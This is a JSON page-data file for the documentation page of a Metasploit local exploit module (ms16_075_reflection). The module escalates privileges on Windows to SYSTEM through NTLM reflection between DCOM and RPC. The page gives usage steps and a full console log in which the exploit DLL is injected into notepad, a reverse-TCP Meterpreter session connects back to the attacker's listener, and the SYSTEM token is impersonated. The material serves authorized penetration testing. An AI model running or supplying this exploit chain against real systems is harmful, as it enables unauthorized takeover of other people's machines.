{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/local/ms16_075_reflection","result":{"data":{"moduleMetadataJson":{"id":"f2e4d46f-7faa-55fb-8527-d12d1250012a","name":"Windows Net-NTLMv2 Reflection DCOM/RPC","fullname":"exploit/windows/local/ms16_075_reflection","description":"Module utilizes the Net-NTLMv2 reflection between DCOM/RPC\n        to achieve a SYSTEM handle for elevation of privilege. Currently the module\n        does not spawn as SYSTEM, however once achieving a shell, one can easily\n        use incognito to impersonate the token.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/windows/local/ms16_075_reflection","documentationSlug":"/modules/documentation/exploit/windows/local/ms16_075_reflection","referencesSlug":"/modules/references/exploit/windows/local/ms16_075_reflection"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>  This module will abuse the SeImperonsate privilege commonly found in\nservices due to the requirement to impersonate a client upon\nauthentication. As such it is possible to impersonate the SYSTEM account\nand relay its NTLM hash to RPC via DCOM. The DLL will perform a MiTM\nattack at which intercepts the hash and relay responses from RPC to be\nable to establish a handle to a new SYSTEM token. Some caveats : Set\nyour target option to match the architecture of your Meterpreter\nsession, else it will inject the wrong architecture DLL into the process\nof a seperate architecture. Additionally, after you have established a\nsession, you must use incognito to imperonsate the SYSTEM Token.</p>\n<h2 id=\"build-instructions\" style=\"position:relative;\"><a href=\"#build-instructions\" aria-label=\"build instructions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Build Instructions</h2>\n<p>This builds using visual studio 2017 and tools v141.  Attempts\nto compile with previous verstions of build tools will succeed but\nthe resulting binary fails to exploit the vulnerability.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<p>  You'll first need to obtain a session on the target system.\nNext, once the module is loaded, one simply needs to set the\n<code class=\"language-text\">payload</code> and <code class=\"language-text\">session</code> options, in addition to architecture.</p>\n<p>  Your user at which you are trying to exploit must have <code class=\"language-text\">SeImpersonate</code>\nprivileges.</p>\n<p>  The module has a hardcoded timeout of 20 seconds, as the attack may\nnot work immediately and take a few seconds to start. Also, check to\nmake sure port 6666 is inherently not in use else the exploit will not\nrun properly.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  Name Current Setting Required Description\n   ---- --------------- -------- -----------\n   SESSION 48 yes The session to run this module on. Payload options \n(windows/x64/meterpreter/reverse_tcp):\n   Name Current Setting Required Description\n   ---- --------------- -------- -----------\n   EXITFUNC thread yes Exit technique (Accepted: &#39;&#39;, seh, thread, \nprocess, none)\n   LHOST ens3 yes The listen address (an interface may be specified)\n   LPORT 3312 yes The listen port Exploit target:\n   Id Name\n   -- ----\n   1 Windows x64 msf exploit(windows/local/ms16_075_reflection) &gt; run \n[*] Started reverse TCP handler on -snip-:3312\n[*] Launching notepad to host the exploit... [+] Process 3564 launched.\n[*] Reflectively injecting the exploit DLL into 3564...\n[*] Injecting exploit into 3564...\n[*] Exploit injected. Injecting payload into 3564...\n[*] Payload injected. Executing exploit..\n[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.\n[*] Sending stage (206403 bytes) to -snip-\n[*] Meterpreter session 49 opened (-snip-:3312 -&gt; -snip-:55306) at 2018-08-03 01:54:18 -0400\nmeterpreter &gt; load incognito \nLoading extension incognito...Success.\nmeterpreter &gt; impersonate_token \n&#39;NT AUTHORITY\\SYSTEM&#39;\n[-] Warning: Not currently running as SYSTEM, not all tokens will be available\n             Call rev2self if primary process token is SYSTEM\n[-] No delegation token available\n[+] Successfully impersonated user NT AUTHORITY\\SYSTEM\nmeterpreter &gt; getsystem -t 1 ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"f2e4d46f-7faa-55fb-8527-d12d1250012a"}}}